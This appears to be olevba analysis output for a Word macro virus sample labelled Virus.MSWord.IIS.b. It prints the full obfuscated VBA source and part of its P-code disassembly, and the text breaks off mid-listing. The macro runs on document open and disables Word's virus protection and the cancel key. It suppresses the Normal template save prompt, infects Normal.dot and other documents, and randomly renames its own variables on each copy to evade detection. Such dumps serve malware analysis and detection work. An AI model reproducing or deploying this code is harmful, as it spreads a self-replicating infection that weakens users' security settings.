olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
¤õ´‰ÁíîÛ“¼‘Ìàì…ôôß…ß©«¾¢¢ˆÑ¢……Æ¨åÚ¥Ã¢Ôºœï  = "´˜Ä¶ŸÂõ§ö¢ïç"
ß×ù•´ºê‚ = ActiveDocument.VBProject.VBComponents(1).CodeModule.countoflines
™•µŒð�ÑâˆâàÝ÷ß = NormalTemplate.VBProject.VBComponents(1).CodeModule.countoflines
Application.Options.VirusProtection = False
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.SaveNormalPrompt = False
If ß×ù•´ºê‚ > 169 And ™•µŒð�ÑâˆâàÝ÷ß > 169 Then Exit Sub
If ™•µŒð�ÑâˆâàÝ÷ß > 169 Then
Set �‰¬�¨¢Ë†ÂßÀ¦Œî¾�Ó“›èÅª»ôæ�éó = ActiveDocument
Set ‡Óµ½’ùé„�� = NormalTemplate
GoTo •ŠÊ¨Ä ÖÌÓÙ£¡µˆ­ÁÀÒé§’ë ±å
End If
If ™•µŒð�ÑâˆâàÝ÷ß < 170 Then
Set �‰¬�¨¢Ë†ÂßÀ¦Œî¾�Ó“›èÅª»ôæ�éó = NormalTemplate
Set ‡Óµ½’ùé„�� = ActiveDocument
End If
ReDim ƒê¶—Ð(50, 50)
¸£ƒ‡ÅÍ×Äè×ŽÌ = ‡Óµ½’ùé„��.VBProject.VBComponents(1).CodeModule.countoflines
ß×ù•´ºê‚ = 0
Do Until ß×ù•´ºê‚ = ¸£ƒ‡ÅÍ×Äè×ŽÌ
ß×ù•´ºê‚ = ß×ù•´ºê‚ + 1
ä�Ã÷�Ð÷Ô = ‡Óµ½’ùé„��.VBProject.VBComponents(1).CodeModule.Lines(ß×ù•´ºê‚, 1)
If Left(ä�Ã÷�Ð÷Ô, 1) = "'" Then
ßùŽ äÙ‡áÕÄ­Åò = Len(ä�Ã÷�Ð÷Ô)
ä�Ã÷�Ð÷Ô = Mid(ä�Ã÷�Ð÷Ô, 2, ßùŽ äÙ‡áÕÄ­Åò)
 Ü = ""
Ê®· = Len(ä�Ã÷�Ð÷Ô)
Randomize Timer
Ò–À½¡ÑµÎŠÐØ�‡£®×ÂŽ½É×¡´²:
êµ—èùÙ×ß¹Èö¶ˆ£ = CInt(Rnd * 30) + 1
For Ýˆï™‡ä �¿…ì­Ô = 1 To êµ—èùÙ×ß¹Èö¶ˆ£
'™•µŒð�ÑâˆâàÝ÷ß
'�‰¬�¨¢Ë†ÂßÀ¦Œî¾�Ó“›èÅª»ôæ�éó
'‡Óµ½’ùé„��
'Ò¶Ž¸šÌ¹×ô©œ–œð
'øŠòÓù ½œ
'³‘êîˆÈ�óøÎÎ¿Íï
'ÎÁ�à­ä¢˜¤ºøœÊÜÛ
'ß×ù•´ºê‚
'Š
'™Ìòç¿ð×—¤
'ì »ï½–Ð¹à·í¡Œà˜‘‡ß
'ßùŽ äÙ‡áÕÄ­Åò
'ó•¨èÀ‚±™ÙÓ‰Ãæ•¶Æá
'ž÷�
'Æï£¯ÎàºÇÎŒ£ˆä˜´õ—ííÈÕÐˆ²
'Ò–À½¡ÑµÎŠÐØ�‡£®×ÂŽ½É×¡´²
'ìÜ·Çª¼�œÃ‰Ö�¤ÎŒ�¼¥„û÷ð”
'Ìõ·
'Ü¿ŠÏ‘Ô´˜ð
'Ê®·
'ä�Ã÷�Ð÷Ô
'Æî¨µŒ ƒ¥Ï§ÚÊ®ÆùÊ­”ôÄá™°ÄñÄŠ
'×†òçŽ±éç¾´·³ŸËä¹õ¿Ð‹�ˆ°¹šÛ
'°Ó²³¨—³�Žß�ÆÍž÷ûÈÇ‘
'Ü¿ŠÏ‘Ô´˜ð
'ßùŽ äÙ‡áÕÄ­Åò
'Š
'§Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜
'³‘êîˆÈ�óøÎÎ¿Íï
'¸£ƒ‡ÅÍ×Äè×ŽÌ
'­Úé÷Éï²»ú¢§ö�‡ÚÌ‰
'Ýˆï™‡ä �¿…ì­Ô
'™Ìòç¿ð×—¤
'�åÎ„�¯´­­Îñ�•¸˜
'àïÃ¼†¸
'ç¨œ»Ö¦Ýð
'ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»�
'õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–š
' Ü
'‘•£™È“á¥²øÔ¨Ù‹§ç®íé„¥ä«’ÈÏ­
'êµ—èùÙ×ß¹Èö¶ˆ£
'Ýˆï™‡ä �¿…ì­Ô
'ƒê¶—Ð
'À½
'ß×ù•´ºê‚
'°Ó²³¨—³�Žß�ÆÍž÷ûÈÇ‘
'ò‹ŸÍž¼ÎÄÌ¤²
'•ŠÊ¨Ä ÖÌÓÙ£¡µˆ­ÁÀÒé§’ë ±å
'¤õ´‰ÁíîÛ“¼‘Ìàì…ôôß…ß©«¾¢¢ˆÑ¢……
õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–š:
ò‹ŸÍž¼ÎÄÌ¤² = CInt(Rnd * 250) + 1
If ò‹ŸÍž¼ÎÄÌ¤² = 13 Then GoTo õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–š
If ò‹ŸÍž¼ÎÄÌ¤² < 65 Then GoTo õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–š
If ò‹ŸÍž¼ÎÄÌ¤² < 130 Then GoTo õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–š
 Ü =  Ü & Chr(ò‹ŸÍž¼ÎÄÌ¤²)
Next Ýˆï™‡ä �¿…ì­Ô
ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� = ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� + 1
ƒê¶—Ð(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»�, 1) = ä�Ã÷�Ð÷Ô
ƒê¶—Ð(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»�, 2) =  Ü
End If
Loop
•ŠÊ¨Ä ÖÌÓÙ£¡µˆ­ÁÀÒé§’ë ±å:
ß×ù•´ºê‚ = 1
§Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ = "Private Sub Document_Open()" & Chr(13)
If ™•µŒð�ÑâˆâàÝ÷ß < 170 Then
êµ—èùÙ×ß¹Èö¶ˆ£ = CInt(Rnd * 30) + 1
For Ýˆï™‡ä �¿…ì­Ô = 1 To êµ—èùÙ×ß¹Èö¶ˆ£
�åÎ„�¯´­­Îñ�•¸˜:
Ü¿ŠÏ‘Ô´˜ð = CInt(Rnd * 250)
If Ü¿ŠÏ‘Ô´˜ð = 13 Then GoTo �åÎ„�¯´­­Îñ�•¸˜
If Ü¿ŠÏ‘Ô´˜ð < 65 Then GoTo �åÎ„�¯´­­Îñ�•¸˜
If Ü¿ŠÏ‘Ô´˜ð < 130 Then GoTo �åÎ„�¯´­­Îñ�•¸˜
 Ü =  Ü & Chr(Ü¿ŠÏ‘Ô´˜ð)
Next Ýˆï™‡ä �¿…ì­Ô
êµ—èùÙ×ß¹Èö¶ˆ£ = CInt(Rnd * 20)
For ‘•£™È“á¥²øÔ¨Ù‹§ç®íé„¥ä«’ÈÏ­ = 1 To êµ—èùÙ×ß¹Èö¶ˆ£
àïÃ¼†¸:
Ü¿ŠÏ‘Ô´˜ð = CInt(Rnd * 250)
If Ü¿ŠÏ‘Ô´˜ð = 13 Then GoTo àïÃ¼†¸
If Ü¿ŠÏ‘Ô´˜ð = 34 Then GoTo àïÃ¼†¸
If Ü¿ŠÏ‘Ô´˜ð < 130 Then GoTo àïÃ¼†¸
°Ó²³¨—³�Žß�ÆÍž÷ûÈÇ‘ = °Ó²³¨—³�Žß�ÆÍž÷ûÈÇ‘ & Chr(Ü¿ŠÏ‘Ô´˜ð)
Next ‘•£™È“á¥²øÔ¨Ù‹§ç®íé„¥ä«’ÈÏ­
§Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ = §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ &  Ü & "=" & Chr(34) & °Ó²³¨—³�Žß�ÆÍž÷ûÈÇ‘ & Chr(34) & Chr(13)
End If
ßùŽ äÙ‡áÕÄ­Åò = ‡Óµ½’ùé„��.VBProject.VBComponents(1).CodeModule.countoflines
For Š = 2 To ßùŽ äÙ‡áÕÄ­Åò
§Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ = §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ & ‡Óµ½’ùé„��.VBProject.VBComponents(1).CodeModule.Lines(Š, 1) & Chr(13)
Next Š
If ™•µŒð�ÑâˆâàÝ÷ß > 169 Then GoTo ¤õ´‰ÁíîÛ“¼‘Ìàì…ôôß…ß©«¾¢¢ˆÑ¢……
Do
³‘êîˆÈ�óøÎÎ¿Íï = 0
¸£ƒ‡ÅÍ×Äè×ŽÌ = Len(§Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜)
À½ = À½ + 1
If ƒê¶—Ð(À½, 1) = "" Then GoTo ¤õ´‰ÁíîÛ“¼‘Ìàì…ôôß…ß©«¾¢¢ˆÑ¢……
Ê®· = Len(ƒê¶—Ð(À½, 1))
êµ—èùÙ×ß¹Èö¶ˆ£ = ƒê¶—Ð(À½, 1)
Do Until ³‘êîˆÈ�óøÎÎ¿Íï = ¸£ƒ‡ÅÍ×Äè×ŽÌ
¸£ƒ‡ÅÍ×Äè×ŽÌ = Len(§Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜)
³‘êîˆÈ�óøÎÎ¿Íï = ³‘êîˆÈ�óøÎÎ¿Íï + 1
­Úé÷Éï²»ú¢§ö�‡ÚÌ‰ = Mid(§Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜, ³‘êîˆÈ�óøÎÎ¿Íï, Ê®·)
If UCase(­Úé÷Éï²»ú¢§ö�‡ÚÌ‰) = UCase(êµ—èùÙ×ß¹Èö¶ˆ£) Then
If ³‘êîˆÈ�óøÎÎ¿Íï = 1 Then
ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� = Mid(§Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜, ³‘êîˆÈ�óøÎÎ¿Íï + Ê®·, 1)
™Ìòç¿ð×—¤ = 0
If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»�) < 65 Then ™Ìòç¿ð×—¤ = 1
If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»�) > 90 And Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»�) < 97 Then ™Ìòç¿ð×—¤ = 1
If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»�) > 122 Then ™Ìòç¿ð×—¤ = 1
If ™Ìòç¿ð×—¤ = 1 Then
ç¨œ»Ö¦Ýð = ç¨œ»Ö¦Ýð & ƒê¶—Ð(À½, 2) & Mid(§Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜, ³‘êîˆÈ�óøÎÎ¿Íï + Ê®·, ¸£ƒ‡ÅÍ×Äè×ŽÌ)
End If
Else
™Ìòç¿ð×—¤ = 0
ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� = Mid(§Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜, ³‘êîˆÈ�óøÎÎ¿Íï - 1, 1)
If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»�) < 65 Then ™Ìòç¿ð×—¤ = 1
If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»�) > 90 And Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»�) < 97 Then ™Ìòç¿ð×—¤ = 1
If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»�) > 122 Then ™Ìòç¿ð×—¤ = 1
If ™Ìòç¿ð×—¤ = 1 Then
ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� = Mid(§Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜, ³‘êîˆÈ�óøÎÎ¿Íï + Ê®·, 1)
™Ìòç¿ð×—¤ = 0
If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»�) < 65 Then ™Ìòç¿ð×—¤ = 1
If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»�) > 90 And Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»�) < 97 Then ™Ìòç¿ð×—¤ = 1
If Asc(ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»�) > 122 Then ™Ìòç¿ð×—¤ = 1
If ™Ìòç¿ð×—¤ = 1 Then
ç¨œ»Ö¦Ýð = Mid(§Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜, 1, ³‘êîˆÈ�óøÎÎ¿Íï - 1)
ç¨œ»Ö¦Ýð = ç¨œ»Ö¦Ýð & ƒê¶—Ð(À½, 2) & Mid(§Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜, ³‘êîˆÈ�óøÎÎ¿Íï + Ê®·, ¸£ƒ‡ÅÍ×Äè×ŽÌ)
§Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ = ç¨œ»Ö¦Ýð
End If
End If
End If
End If
Loop
Loop
¤õ´‰ÁíîÛ“¼‘Ìàì…ôôß…ß©«¾¢¢ˆÑ¢……:
¸£ƒ‡ÅÍ×Äè×ŽÌ = �‰¬�¨¢Ë†ÂßÀ¦Œî¾�Ó“›èÅª»ôæ�éó.VBProject.VBComponents(1).CodeModule.countoflines
�‰¬�¨¢Ë†ÂßÀ¦Œî¾�Ó“›èÅª»ôæ�éó.VBProject.VBComponents(1).CodeModule.deletelines 1, ¸£ƒ‡ÅÍ×Äè×ŽÌ
�‰¬�¨¢Ë†ÂßÀ¦Œî¾�Ó“›èÅª»ôæ�éó.VBProject.VBComponents(1).CodeModule.AddFromstring (§Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜)
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.IIS.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 24394 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	LitStr 0x000C "´˜Ä¶ŸÂõ§ö¢ïç"
' 	St ¤õ´‰ÁíîÛ“¼‘Ìàì…ôôß…ß©«¾¢¢ˆÑ¢……Æ¨åÚ¥Ã¢Ôºœï  
' Line #2:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ß×ù•´ºê‚ 
' Line #3:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ™•µŒð�ÑâˆâàÝ÷ß 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #5:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	Ld ß×ù•´ºê‚ 
' 	LitDI2 0x00A9 
' 	Gt 
' 	Ld ™•µŒð�ÑâˆâàÝ÷ß 
' 	LitDI2 0x00A9 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #9:
' 	Ld ™•µŒð�ÑâˆâàÝ÷ß 
' 	LitDI2 0x00A9 
' 	Gt 
' 	IfBlock 
' Line #10:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set �‰¬�¨¢Ë†ÂßÀ¦Œî¾�Ó“›èÅª»ôæ�éó 
' Line #11:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set ‡Óµ½’ùé„�� 
' Line #12:
' 	GoTo •ŠÊ¨Ä ÖÌÓÙ£¡µˆ­ÁÀÒé§’ë ±å 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	Ld ™•µŒð�ÑâˆâàÝ÷ß 
' 	LitDI2 0x00AA 
' 	Lt 
' 	IfBlock 
' Line #15:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set �‰¬�¨¢Ë†ÂßÀ¦Œî¾�Ó“›èÅª»ôæ�éó 
' Line #16:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ‡Óµ½’ùé„�� 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	OptionBase 
' 	LitDI2 0x0032 
' 	OptionBase 
' 	LitDI2 0x0032 
' 	Redim ƒê¶—Ð 0x0002 (As Variant)
' Line #19:
' 	LitDI2 0x0001 
' 	Ld ‡Óµ½’ùé„�� 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ¸£ƒ‡ÅÍ×Äè×ŽÌ 
' Line #20:
' 	LitDI2 0x0000 
' 	St ß×ù•´ºê‚ 
' Line #21:
' 	Ld ß×ù•´ºê‚ 
' 	Ld ¸£ƒ‡ÅÍ×Äè×ŽÌ 
' 	Eq 
' 	DoUnitil 
' Line #22:
' 	Ld ß×ù•´ºê‚ 
' 	LitDI2 0x0001 
' 	Add 
' 	St ß×ù•´ºê‚ 
' Line #23:
' 	Ld ß×ù•´ºê‚ 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ‡Óµ½’ùé„�� 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St ä�Ã÷�Ð÷Ô 
' Line #24:
' 	Ld ä�Ã÷�Ð÷Ô 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld ä�Ã÷�Ð÷Ô 
' 	FnLen 
' 	St ßùŽ äÙ‡áÕÄ­Åò 
' Line #26:
' 	Ld ä�Ã÷�Ð÷Ô 
' 	LitDI2 0x0002 
' 	Ld ßùŽ äÙ‡áÕÄ­Åò 
' 	ArgsLd Mid$ 0x0003 
' 	St ä�Ã÷�Ð÷Ô 
' Line #27:
' 	LitStr 0x0000 ""
' 	St  Ü 
' Line #28:
' 	Ld ä�Ã÷�Ð÷Ô 
' 	FnLen 
' 	St Ê®· 
' Line #29:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #30:
' 	Label Ò–À½¡ÑµÎŠÐØ�‡£®×ÂŽ½É×¡´² 
' Line #31:
' 	Ld Rnd 
' 	LitDI2 0x001E 
' 	Mul 
' 	Coerce (Int) 
' 	LitDI2 0x0001 
' 	Add 
' 	St êµ—èùÙ×ß¹Èö¶ˆ£ 
' Line #32:
' 	StartForVariable 
' 	Ld Ýˆï™‡ä �¿…ì­Ô 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld êµ—èùÙ×ß¹Èö¶ˆ£ 
' 	For 
' Line #33:
' 	QuoteRem 0x0000 0x000E "™•µŒð�ÑâˆâàÝ÷ß"
' Line #34:
' 	QuoteRem 0x0000 0x001C "�‰¬�¨¢Ë†ÂßÀ¦Œî¾�Ó“›èÅª»ôæ�éó"
' Line #35:
' 	QuoteRem 0x0000 0x000A "‡Óµ½’ùé„��"
' Line #36:
' 	QuoteRem 0x0000 0x000E "Ò¶Ž¸šÌ¹×ô©œ–œð"
' Line #37:
' 	QuoteRem 0x0000 0x0008 "øŠòÓù ½œ"
' Line #38:
' 	QuoteRem 0x0000 0x000E "³‘êîˆÈ�óøÎÎ¿Íï"
' Line #39:
' 	QuoteRem 0x0000 0x000F "ÎÁ�à­ä¢˜¤ºøœÊÜÛ"
' Line #40:
' 	QuoteRem 0x0000 0x0008 "ß×ù•´ºê‚"
' Line #41:
' 	QuoteRem 0x0000 0x0001 "Š"
' Line #42:
' 	QuoteRem 0x0000 0x0009 "™Ìòç¿ð×—¤"
' Line #43:
' 	QuoteRem 0x0000 0x0012 "ì »ï½–Ð¹à·í¡Œà˜‘‡ß"
' Line #44:
' 	QuoteRem 0x0000 0x000D "ßùŽ äÙ‡áÕÄ­Åò"
' Line #45:
' 	QuoteRem 0x0000 0x0011 "ó•¨èÀ‚±™ÙÓ‰Ãæ•¶Æá"
' Line #46:
' 	QuoteRem 0x0000 0x0003 "ž÷�"
' Line #47:
' 	QuoteRem 0x0000 0x0018 "Æï£¯ÎàºÇÎŒ£ˆä˜´õ—ííÈÕÐˆ²"
' Line #48:
' 	QuoteRem 0x0000 0x0018 "Ò–À½¡ÑµÎŠÐØ�‡£®×ÂŽ½É×¡´²"
' Line #49:
' 	QuoteRem 0x0000 0x0017 "ìÜ·Çª¼�œÃ‰Ö�¤ÎŒ�¼¥„û÷ð”"
' Line #50:
' 	QuoteRem 0x0000 0x0003 "Ìõ·"
' Line #51:
' 	QuoteRem 0x0000 0x0009 "Ü¿ŠÏ‘Ô´˜ð"
' Line #52:
' 	QuoteRem 0x0000 0x0003 "Ê®·"
' Line #53:
' 	QuoteRem 0x0000 0x0008 "ä�Ã÷�Ð÷Ô"
' Line #54:
' 	QuoteRem 0x0000 0x001B "Æî¨µŒ ƒ¥Ï§ÚÊ®ÆùÊ­”ôÄá™°ÄñÄŠ"
' Line #55:
' 	QuoteRem 0x0000 0x001A "×†òçŽ±éç¾´·³ŸËä¹õ¿Ð‹�ˆ°¹šÛ"
' Line #56:
' 	QuoteRem 0x0000 0x0013 "°Ó²³¨—³�Žß�ÆÍž÷ûÈÇ‘"
' Line #57:
' 	QuoteRem 0x0000 0x0009 "Ü¿ŠÏ‘Ô´˜ð"
' Line #58:
' 	QuoteRem 0x0000 0x000D "ßùŽ äÙ‡áÕÄ­Åò"
' Line #59:
' 	QuoteRem 0x0000 0x0001 "Š"
' Line #60:
' 	QuoteRem 0x0000 0x001C "§Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜"
' Line #61:
' 	QuoteRem 0x0000 0x000E "³‘êîˆÈ�óøÎÎ¿Íï"
' Line #62:
' 	QuoteRem 0x0000 0x000C "¸£ƒ‡ÅÍ×Äè×ŽÌ"
' Line #63:
' 	QuoteRem 0x0000 0x0011 "­Úé÷Éï²»ú¢§ö�‡ÚÌ‰"
' Line #64:
' 	QuoteRem 0x0000 0x000D "Ýˆï™‡ä �¿…ì­Ô"
' Line #65:
' 	QuoteRem 0x0000 0x0009 "™Ìòç¿ð×—¤"
' Line #66:
' 	QuoteRem 0x0000 0x000F "�åÎ„�¯´­­Îñ�•¸˜"
' Line #67:
' 	QuoteRem 0x0000 0x0006 "àïÃ¼†¸"
' Line #68:
' 	QuoteRem 0x0000 0x0008 "ç¨œ»Ö¦Ýð"
' Line #69:
' 	QuoteRem 0x0000 0x0018 "ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»�"
' Line #70:
' 	QuoteRem 0x0000 0x0017 "õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–š"
' Line #71:
' 	QuoteRem 0x0000 0x0002 " Ü"
' Line #72:
' 	QuoteRem 0x0000 0x001B "‘•£™È“á¥²øÔ¨Ù‹§ç®íé„¥ä«’ÈÏ­"
' Line #73:
' 	QuoteRem 0x0000 0x000E "êµ—èùÙ×ß¹Èö¶ˆ£"
' Line #74:
' 	QuoteRem 0x0000 0x000D "Ýˆï™‡ä �¿…ì­Ô"
' Line #75:
' 	QuoteRem 0x0000 0x0005 "ƒê¶—Ð"
' Line #76:
' 	QuoteRem 0x0000 0x0002 "À½"
' Line #77:
' 	QuoteRem 0x0000 0x0008 "ß×ù•´ºê‚"
' Line #78:
' 	QuoteRem 0x0000 0x0013 "°Ó²³¨—³�Žß�ÆÍž÷ûÈÇ‘"
' Line #79:
' 	QuoteRem 0x0000 0x000B "ò‹ŸÍž¼ÎÄÌ¤²"
' Line #80:
' 	QuoteRem 0x0000 0x0019 "•ŠÊ¨Ä ÖÌÓÙ£¡µˆ­ÁÀÒé§’ë ±å"
' Line #81:
' 	QuoteRem 0x0000 0x001E "¤õ´‰ÁíîÛ“¼‘Ìàì…ôôß…ß©«¾¢¢ˆÑ¢……"
' Line #82:
' 	Label õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–š 
' Line #83:
' 	Ld Rnd 
' 	LitDI2 0x00FA 
' 	Mul 
' 	Coerce (Int) 
' 	LitDI2 0x0001 
' 	Add 
' 	St ò‹ŸÍž¼ÎÄÌ¤² 
' Line #84:
' 	Ld ò‹ŸÍž¼ÎÄÌ¤² 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–š 
' 	EndIf 
' Line #85:
' 	Ld ò‹ŸÍž¼ÎÄÌ¤² 
' 	LitDI2 0x0041 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–š 
' 	EndIf 
' Line #86:
' 	Ld ò‹ŸÍž¼ÎÄÌ¤² 
' 	LitDI2 0x0082 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo õÄÈÎáÞÏäÖò¼ºŒìÙÚáç¶Ñí–š 
' 	EndIf 
' Line #87:
' 	Ld  Ü 
' 	Ld ò‹ŸÍž¼ÎÄÌ¤² 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St  Ü 
' Line #88:
' 	StartForVariable 
' 	Ld Ýˆï™‡ä �¿…ì­Ô 
' 	EndForVariable 
' 	NextVar 
' Line #89:
' 	Ld ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' 	LitDI2 0x0001 
' 	Add 
' 	St ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' Line #90:
' 	Ld ä�Ã÷�Ð÷Ô 
' 	Ld ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' 	LitDI2 0x0001 
' 	ArgsSt ƒê¶—Ð 0x0002 
' Line #91:
' 	Ld  Ü 
' 	Ld ª£¨§©ôä«šÊøæû±™ð×ïÉŒû£»� 
' 	LitDI2 0x0002 
' 	ArgsSt ƒê¶—Ð 0x0002 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	Loop 
' Line #94:
' 	Label •ŠÊ¨Ä ÖÌÓÙ£¡µˆ­ÁÀÒé§’ë ±å 
' Line #95:
' 	LitDI2 0x0001 
' 	St ß×ù•´ºê‚ 
' Line #96:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St §Ÿ§¼àöà™ææ�éÂ–¹¡’¿ó´¶Éï±¸œ“˜ 
' Line #97:
' 	Ld ™•µŒð�ÑâˆâàÝ÷ß 
' 	LitDI2 0x00AA 
' 	Lt 
' 	IfBlock 
' Line #98:
' 	Ld Rnd 
' 	LitDI2 0x001E 
' 	Mul 
' 	Coerce (Int) 
' 	LitDI2 0x0001 
' 	Add 
' 	St êµ—èùÙ×ß¹Èö¶ˆ£ 
' Line #99:
' 	StartForVariable 
' 	Ld Ýˆï™‡ä �¿…ì­Ô 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld êµ—èùÙ×ß¹Èö¶ˆ£ 
' 	For 
' Line #100:
' 	Label �åÎ„�¯´­­Îñ�•¸˜ 
' Line #101:
' 	Ld Rnd 
' 	LitDI2 0x00FA 
' 	Mul 
' 	Coerce (Int) 
' 	St Ü¿ŠÏ‘Ô´˜ð 
' Line #102:
' 	Ld Ü¿ŠÏ‘Ô´˜ð 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo �åÎ„�¯´­­Îñ�•¸˜ 
' 	EndIf 
' Line #103:
' 	Ld Ü¿ŠÏ‘Ô´˜ð 
' 	LitDI2 0x0041 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo �åÎ„�¯´­­Îñ�•¸˜ 
' 	EndIf 
' Line #104:
' 	Ld Ü¿ŠÏ‘Ô´˜ð 
' 	LitDI2 0x0082 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo �åÎ„�¯´­­Îñ�•¸˜ 
' 	EndIf 
' Line #105:
' 	Ld  Ü 
' 	Ld Ü¿ŠÏ‘Ô´˜ð 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St  Ü 
' Line #106:
' 	StartForVariable 
' 	Ld Ýˆï™‡ä �¿…ì­Ô 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	Ld Rnd 
